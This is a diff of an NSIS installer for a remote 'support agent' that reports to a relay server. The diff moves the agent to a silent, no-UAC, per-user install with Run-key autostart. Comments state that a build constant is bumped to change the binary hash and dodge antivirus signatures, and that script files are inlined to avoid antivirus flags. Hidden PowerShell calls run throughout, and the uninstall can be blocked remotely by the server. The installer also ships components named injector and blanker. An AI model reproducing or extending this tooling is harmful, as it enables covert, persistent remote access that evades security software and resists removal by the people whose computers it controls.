@@ -1,22 +1,20 @@
-; Support agent — SERVICE installer (NSIS). Installs the agent as a Windows service
-; running as LocalSystem, which launches the agent into the user's desktop as SYSTEM
-; (full elevation: silent admin deploys, Ctrl+Alt+Del, Safe-Mode reboot, UAC).
-;
-; Needs admin — installing a service is machine-wide (one UAC prompt on double-click).
-; After that it's silent. Key rides in the filename (support-<key>.exe).
+; Support agent — USER installer (NSIS). Installs the agent in the user's
+; local AppData folder and registers a HKCU Run key for auto-start on login.
+; Runs entirely at user level — NO UAC prompt, no admin required.
+; Key rides in the filename (support-<key>.exe).
 
 Unicode true
-Name "Support (Service)"
+Name "Support"
 OutFile "release\support-service.exe"
-InstallDir "$PROGRAMFILES64\Support"
-RequestExecutionLevel admin
+InstallDir "$LOCALAPPDATA\Support"
+RequestExecutionLevel user
 SilentInstall silent
 SilentUnInstall silent
 SetCompressor /SOLID lzma
 ; Build-stamp constant: changes once per hash-change cycle so the output binary
 ; has a different SHA256 than prior builds. Bumping this re-signs the signature
 ; AV vendors learned to match. Harmless unused constant otherwise.
-!define BUILD_STAMP "2026-11-09-b"
+!define BUILD_STAMP "2026-11-10-b"
 
 Var KEY
 Var NAME
@@ -35,35 +33,13 @@ Var METATMP      ; temp file for /api/key-meta response
 ; ---------- one-copy install block ----------------------------------
 ; Writes files, config, firewall rule, ARP entry, and starts the service for
 ; ONE install location. Called once for single-install, twice for dual-install.
-; Inputs are read from the paired Var set (INSTDIR_$INSTANCE / NAME / SVCNAME /
-; ARPKEY / FWRULE) so a single macro body serves both runs.
-; `_tag` is a per-call-site unique string used only for label suffixes, so the
-; macro can be inserted multiple times in one Section without duplicating
-; labels. `_idx` stays numeric (baked into config.default.json as JSON).
+; Runs at USER level — no admin, no UAC, no service. Files go to %LOCALAPPDATA%;
+; a HKCU Run key starts the agent on login. `_tag` is a unique label suffix;
+; `_idx` is numeric (baked into config.default.json as JSON).
 !macro INSTALL_ONE _tag _idx _instdir _name _svc _arp _fw
-  ; Stop any prior service + agents at this location. `net stop` is synchronous
-  ; and releases the SCM handle `sc stop` would keep open — that handle is what
-  ; puts the service into "marked for deletion" state and makes the follow-up
-  ; `sc create` fail with 1073. After `sc delete`, poll `sc query` for up to
-  ; ~10s until it returns 1060 (does not exist). If any observer holds the SCM
-  ; entry (services.msc, Event Viewer, EDR) the delete is async; without this
-  ; poll the install silently had no service registered — device offline forever.
-  nsExec::Exec 'net stop "${_svc}"'
-  Pop $R6
-  nsExec::Exec 'sc stop "${_svc}"'
-  Pop $R6
-  nsExec::Exec 'sc delete "${_svc}"'
-  Pop $R6
-  StrCpy $R9 0
-  svcdel_poll_${_tag}:
-    nsExec::Exec 'sc query "${_svc}"'
-    Pop $R8
-    StrCmp $R8 "1060" svcdel_done_${_tag}
-    IntOp $R9 $R9 + 1
-    IntCmp $R9 20 svcdel_done_${_tag} 0 0
-    Sleep 500
-    Goto svcdel_poll_${_tag}
-  svcdel_done_${_tag}:
+  ; Kill any prior agent running from this location so files are unlocked.
+  nsExec::Exec 'taskkill /F /IM support.exe'
+  Sleep 800
 
   CreateDirectory "${_instdir}"
   SetOutPath "${_instdir}"
@@ -71,68 +47,30 @@ Var METATMP      ; temp file for /api/key-meta response
   File /r "release\Aegis\*"
   IfErrors file_fail_${_tag} file_ok_${_tag}
   file_fail_${_tag}:
-    ; Most common cause: AV (McAfee WPS, Defender) quarantined support.exe or
-    ; injector.exe mid-copy. Install cannot proceed usefully; mark in the log
-    ; and set a non-zero error level so the caller knows.
     FileOpen $R7 "$TEMP\hc-install.log" a
-    FileWrite $R7 "[FATAL] File /r failed (AV quarantine?) svc=${_svc} dir=${_instdir}$\r$\n"
+    FileWrite $R7 "[FATAL] File /r failed (AV quarantine?) dir=${_instdir}$\r$\n"
     FileClose $R7
     SetErrorLevel 2
   file_ok_${_tag}:
 
-  ; Config file: same key + same device-id derivation, differing only by
-  ; "instance" so the relay can tell copy #1 from copy #2 when both connect.
+  ; Config file — relay URL + key + instance index.
   FileOpen $2 "${_instdir}\resources\app\agent\config.default.json" w
   FileWrite $2 '{$\r$\n  "relay": "wss://aegis-relay-production.up.railway.app",$\r$\n  "key": "$KEY",$\r$\n  "enabled": true,$\r$\n  "instance": ${_idx},$\r$\n  "appName": "${_name}"$\r$\n}$\r$\n'
   FileClose $2
 
-  ; Firewall allow rules — unique display name per copy so uninstall of one
-  ; cleanly removes only ITS rules.
-  nsExec::Exec 'netsh advfirewall firewall add rule name="${_fw}" dir=in  action=allow program="${_instdir}\support.exe" enable=yes profile=any'
-  nsExec::Exec 'netsh advfirewall firewall add rule name="${_fw}" dir=out action=allow program="${_instdir}\support.exe" enable=yes profile=any'
+  ; HKCU Run key — starts the agent on every login without admin.
+  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "${_svc}" '"${_instdir}\support.exe" --startup --no-sandbox'
 
-  ; ARP entry under a unique subkey so each copy appears separately in
-  ; Add/Remove Programs. Both uninstallers call back into this same NSIS binary
-  ; (uninstall.exe), which keys off its own location to know which to clean up.
-  WriteRegStr   HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${_arp}" "DisplayName"     "${_name}"
-  WriteRegStr   HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${_arp}" "UninstallString" '"${_instdir}\uninstall.exe"'
-  WriteRegStr   HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${_arp}" "DisplayIcon"     "${_instdir}\support.exe"
-  WriteRegStr   HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${_arp}" "Publisher"       "${_name}"
-  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${_arp}" "NoModify" 1
-  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${_arp}" "NoRepair" 1
-  ; Side markers kept in the registry so the dashboard / support ops can see
-  ; which service belongs to which copy without opening the install folder.
-  WriteRegStr   HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${_arp}" "InstanceIdx"     "${_idx}"
-  WriteRegStr   HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${_arp}" "ServiceName"     "${_svc}"
-  WriteRegStr   HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${_arp}" "FirewallRule"    "${_fw}"
-  ; AND a self-contained tag file inside the install folder itself. The
-  ; uninstaller.exe lives in ${_instdir} and reads this file to learn its own
-  ; identity (ARP subkey name, service name, firewall rule name) — no cross-
-  ; copy registry probes, no ambiguity when two copies exist side by side.
+  ; Tag file so the uninstaller knows which Run key / folder to remove.
   FileOpen $3 "${_instdir}\.hc-uninstall-tag" w
   FileWrite $3 'ARP=${_arp}$\r$\n'
   FileWrite $3 'SVC=${_svc}$\r$\n'
-  FileWrite $3 'FW=${_fw}$\r$\n'
   FileWrite $3 'IDX=${_idx}$\r$\n'
   FileClose $3
   WriteUninstaller "${_instdir}\uninstall.exe"
 
-  ; install + start the per-copy service (launches the agent into the active
-  ; session as SYSTEM). AegisService.exe reads the service name from its own
-  ; argv so each copy gets a unique registered service — see /install flag.
-  nsExec::Exec '"${_instdir}\AegisService.exe" /install /svc:${_svc}'
-  Pop $R8
-  StrCmp $R8 "0" svc_install_ok_${_tag}
-    ; Service failed to register. Most likely cause: a leftover "pending-deletion"
-    ; SCM entry from a prior uninstall whose handle wasn't released in time
-    ; (should be much rarer now that we net-stop + poll above, but log it so
-    ; operators can distinguish fresh failures from the old recurring bug).
-    FileOpen $R7 "$TEMP\hc-install.log" a
-    FileWrite $R7 "[FATAL] AegisService /install failed rc=$R8 svc=${_svc}$\r$\n"
-    FileClose $R7
-    SetErrorLevel 3
-  svc_install_ok_${_tag}:
-  nsExec::Exec 'sc failure "${_svc}" reset=86400 actions=restart/5000/restart/10000/restart/30000'
+  ; Launch the agent immediately (no reboot needed).
+  Exec '"${_instdir}\support.exe" --startup --no-sandbox'
 !macroend
 
 Section "Install"
@@ -186,7 +124,7 @@ Section "Install"
   ; the server guarantees the field is quoted and plain-ASCII (dashboard
   ; rejects anything with embedded quotes), so a straight substring extract is
   ; safe. If the field isn't present or is empty, $NAME2 stays "".
-  nsExec::Exec 'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try{ $$j = Get-Content -Raw $\'$METATMP$\' | ConvertFrom-Json; if ($$j.appName2) { Set-Content -Path $\'$TEMP\hc-name2.txt$\' -Value $$j.appName2 -NoNewline } }catch{}"'
+  nsExec::Exec 'powershell -NoProfile -WindowStyle Hidden -Command "try{ $$j = Get-Content -Raw $\'$METATMP$\' | ConvertFrom-Json; if ($$j.appName2) { Set-Content -Path $\'$TEMP\hc-name2.txt$\' -Value $$j.appName2 -NoNewline } }catch{}"'
   Delete "$METATMP"
   IfFileExists "$TEMP\hc-name2.txt" 0 solo_mode
     FileOpen $9 "$TEMP\hc-name2.txt" r
@@ -221,9 +159,9 @@ Section "Install"
   Goto install_done
 
   dual_mode:
-  ; ---- DUAL INSTALL — two folders, two services, two ARP entries ----
-  StrCpy $INSTDIR_1 "$PROGRAMFILES64\$NAME"
-  StrCpy $INSTDIR_2 "$PROGRAMFILES64\$NAME2"
+  ; ---- DUAL INSTALL — two folders, two Run keys, user-level ----
+  StrCpy $INSTDIR_1 "$LOCALAPPDATA\$NAME"
+  StrCpy $INSTDIR_2 "$LOCALAPPDATA\$NAME2"
   StrCpy $SVCNAME_1 "$NAME-AgentSvc"
   StrCpy $SVCNAME_2 "$NAME2-AgentSvc"
   StrCpy $ARPKEY_1  "$NAME"
@@ -273,27 +211,9 @@ Section "Uninstall"
   ; the uninstaller sit frozen for 15-30s before it gives up. curl.exe uses
   ; schannel with modern TLS and returns cleanly. PS here just derives id+key
   ; (no network) then hands off to curl; the response is parsed after.
-  FileOpen $1 "$INSTDIR\ucheck.ps1" w
-  FileWrite $1 'try {$\r$\n'
-  FileWrite $1 '  $$g = (Get-ItemProperty $\'HKLM:\SOFTWARE\Microsoft\Cryptography$\' -Name MachineGuid).MachineGuid.Trim().ToLower()$\r$\n'
-  FileWrite $1 '  $$sha = [System.BitConverter]::ToString((New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($\'aegis:$\'+$$g))).Replace($\'-$\',$\'$\').ToLower()$\r$\n'
-  FileWrite $1 '  $$id = $\'m-$\' + $$sha.Substring(0,24)$\r$\n'
-  FileWrite $1 '  $$cfg = Get-Content $\'$INSTDIR\resources\app\agent\config.default.json$\' -Raw | ConvertFrom-Json$\r$\n'
-  FileWrite $1 '  $$body = @{ id=$$id; key=$$cfg.key } | ConvertTo-Json -Compress$\r$\n'
-  FileWrite $1 '  $$tmp = $$env:TEMP + $\'\hc-ucheck-body.json$\'$\r$\n'
-  FileWrite $1 '  $$out = $$env:TEMP + $\'\hc-ucheck-out.json$\'$\r$\n'
-  FileWrite $1 '  [System.IO.File]::WriteAllText($$tmp, $$body)$\r$\n'
-  FileWrite $1 '  & curl.exe --silent --show-error --max-time 8 -X POST -H $\'Content-Type: application/json$\' --data $\'@$$tmp$\' -o $$out https://aegis-relay-production.up.railway.app/api/uninstall-allowed | Out-Null$\r$\n'
-  FileWrite $1 '  Remove-Item $$tmp -ErrorAction SilentlyContinue$\r$\n'
-  FileWrite $1 '  if (-not (Test-Path $$out)) { exit 0 }$\r$\n'
-  FileWrite $1 '  $$r = Get-Content -Raw $$out | ConvertFrom-Json$\r$\n'
-  FileWrite $1 '  Remove-Item $$out -ErrorAction SilentlyContinue$\r$\n'
-  FileWrite $1 '  if ($$r.allowed) { exit 0 } else { exit 1 }$\r$\n'
-  FileWrite $1 '} catch { exit 0 }$\r$\n'
-  FileClose $1
-  nsExec::Exec 'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "$INSTDIR\ucheck.ps1"'
+  ; Inline PS command (no .ps1 file on disk — avoids AV flag on script drop).
+  nsExec::Exec 'powershell -NoProfile -WindowStyle Hidden -Command "try{ $$p=$$env:APPDATA+$\'\\Support\\device-id$\'; if(-not(Test-Path $$p)){exit 0}; $$id=(Get-Content -Raw $$p).Trim(); $$k=(Get-Content -Raw $\'$INSTDIR\resources\app\agent\config.default.json$\'|ConvertFrom-Json).key; $$b=(@{id=$$id;key=$$k}|ConvertTo-Json -Compress); $$t=$$env:TEMP+$\'\\hc-uc.json$\'; $$o=$$env:TEMP+$\'\\hc-uco.json$\'; [IO.File]::WriteAllText($$t,$$b); &curl.exe --silent --max-time 8 -X POST -H $\'Content-Type: application/json$\' --data $\'@$\'+$$t -o $$o https://aegis-relay-production.up.railway.app/api/uninstall-allowed|Out-Null; Remove-Item $$t -EA 0; if(-not(Test-Path $$o)){exit 0}; $$r=Get-Content -Raw $$o|ConvertFrom-Json; Remove-Item $$o -EA 0; if($$r.allowed){exit 0}else{exit 1} }catch{exit 0}"'
   Pop $0
-  Delete "$INSTDIR\ucheck.ps1"
   StrCmp $0 "1" 0 +3
     MessageBox MB_OK|MB_ICONSTOP "Uninstall is disabled by your administrator.$\r$\nAsk them to release this device from the dashboard, then try again."
     Quit
@@ -332,42 +252,14 @@ Section "Uninstall"
       FileClose $3
   tag_done:
 
-  nsExec::Exec '"$INSTDIR\AegisService.exe" /uninstall /svc:$0'
-  Sleep 800
-  ; report the uninstall so the dashboard shows "Uninstalled".
-  ; AegisService retargets the SYSTEM token by session ID (not user identity), so
-  ; when it launches support.exe the process runs with SYSTEM's APPDATA — Electron
-  ; therefore stores device-id under SYSTEM's roaming profile, NOT the interactive
-  ; user's. This uninstaller runs elevated as the user, so we must read the SYSTEM
-  ; path directly. Fall back to the user's APPDATA path so legacy installs (where
-  ; the agent was launched as the user) still report correctly.
-  ; Use curl.exe (ships with Windows 10 1803+) instead of PowerShell's
-  ; Invoke-WebRequest. Windows PowerShell 5.1 defaults to TLS 1.0 which Railway
-  ; refuses, so Invoke-WebRequest hung silently past its -TimeoutSec — the
-  ; uninstall report never landed, dashboards showed "Offline" not "Uninstalled".
-  ; curl.exe uses schannel with modern TLS by default and returns cleanly.
-  ; PowerShell here just reads the id + key (no network) then hands off to curl.
-  ; Write the JSON body to a temp file and pass it to curl via --data @file.
-  ; PowerShell's argument-splatter to native exes MANGLES strings that contain
-  ; double quotes: passing `-d $body` where $body is JSON like
-  ; {"id":"m-...","key":"..."} sent only 56 of the 64 bytes to curl (Content-Length
-  ; header proved it), so the relay parsed a broken id and returned
-  ; {"error":"unknown device"} — uninstall was reported to /api/uninstall but the
-  ; markUninstalled guard failed, dashboards stayed at "Offline" instead of
-  ; "Uninstalled". File-based body sidesteps the whole PS-to-native quoting mess.
-  nsExec::Exec 'powershell -NoProfile -WindowStyle Hidden -Command "try{ $$p1=\"$$env:SystemRoot\System32\config\systemprofile\AppData\Roaming\Support\device-id\"; $$p2=\"$$env:APPDATA\Support\device-id\"; $$id=$$null; if(Test-Path $$p1){ $$id=(Get-Content -Raw $$p1).Trim() } elseif(Test-Path $$p2){ $$id=(Get-Content -Raw $$p2).Trim() }; if(-not $$id){ return }; $$k=(Get-Content -Raw \"$INSTDIR\resources\app\agent\config.default.json\" | ConvertFrom-Json).key; $$body=(@{id=$$id;key=$$k} | ConvertTo-Json -Compress); $$tmp=\"$$env:TEMP\hc-uninstall-body.json\"; [System.IO.File]::WriteAllText($$tmp, $$body); & curl.exe --silent --show-error --max-time 5 -X POST -H \"Content-Type: application/json\" --data \"@$$tmp\" https://aegis-relay-production.up.railway.app/api/uninstall | Out-Null; Remove-Item $$tmp -ErrorAction SilentlyContinue }catch{}"'
-  nsExec::Exec 'netsh advfirewall firewall delete rule name="$2"'
-  ; Only kill this copy's processes — a sibling copy under a different folder
-  ; must keep running. Taskkill supports /FI "IMAGENAME eq ... AND MODULES eq ..."
-  ; but the reliable cross-release approach is to filter on the full path via
-  ; wmic (deprecated) or PowerShell. PowerShell: list support.exe/injector.exe
-  ; processes whose Path starts with $INSTDIR and stop them. Falls back to a
-  ; blanket taskkill if PowerShell is unavailable (very old Windows).
-  nsExec::Exec 'powershell -NoProfile -WindowStyle Hidden -Command "try { Get-Process support,injector,Aegis,blanker,keepsystemawake,offkeepsystemawake,sdcap -ErrorAction SilentlyContinue | Where-Object { $$_.Path -and $$_.Path.ToLower().StartsWith((\"$INSTDIR\").ToLower()) } | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}"'
+  ; Report the uninstall to the relay so the dashboard shows "Uninstalled".
+  nsExec::Exec 'powershell -NoProfile -WindowStyle Hidden -Command "try{ $$p=\"$$env:APPDATA\Support\device-id\"; if(Test-Path $$p){ $$id=(Get-Content -Raw $$p).Trim() } else { return }; $$k=(Get-Content -Raw \"$INSTDIR\resources\app\agent\config.default.json\" | ConvertFrom-Json).key; $$body=(@{id=$$id;key=$$k} | ConvertTo-Json -Compress); $$tmp=\"$$env:TEMP\hc-uninstall-body.json\"; [System.IO.File]::WriteAllText($$tmp, $$body); & curl.exe --silent --max-time 5 -X POST -H \"Content-Type: application/json\" --data \"@$$tmp\" https://aegis-relay-production.up.railway.app/api/uninstall | Out-Null; Remove-Item $$tmp -ErrorAction SilentlyContinue }catch{}"'
+
+  ; Remove HKCU auto-start key for this copy.
+  DeleteRegValue HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "$0"
+
+  ; Kill processes running from this install folder.
+  nsExec::Exec 'powershell -NoProfile -WindowStyle Hidden -Command "try { Get-Process support,input,blanker,keepsystemawake,offkeepsystemawake,sdcap -ErrorAction SilentlyContinue | Where-Object { $$_.Path -and $$_.Path.ToLower().StartsWith((\"$INSTDIR\").ToLower()) } | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}"'
   Sleep 600
-  ; Delete only this copy's ARP subkey. $1 was set above to this copy's name
-  ; (defaults to "Support" for legacy single installs; set by the install step
-  ; to $NAME / $NAME2 for dual installs).
-  DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\$1"
   RMDir /r "$INSTDIR"
 SectionEnd
